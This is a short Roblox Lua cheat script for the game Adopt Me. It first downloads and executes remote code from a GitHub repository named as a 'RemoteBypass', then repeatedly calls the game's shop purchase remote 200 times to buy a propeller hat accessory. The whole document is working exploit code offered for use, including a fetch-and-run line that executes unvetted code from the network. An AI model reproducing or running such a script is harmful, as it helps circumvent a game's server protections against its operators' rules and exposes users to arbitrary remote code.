loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
for i = 1, 200 do
    task.wait(0.1)

    local args = {
        "pet_accessories",
        "propeller_hat",
        {
            buy_count = 1
        }
    }

    game:GetService("ReplicatedStorage")
        :WaitForChild("API")
        :WaitForChild("ShopAPI/BuyItem")
        :InvokeServer(unpack(args))
end
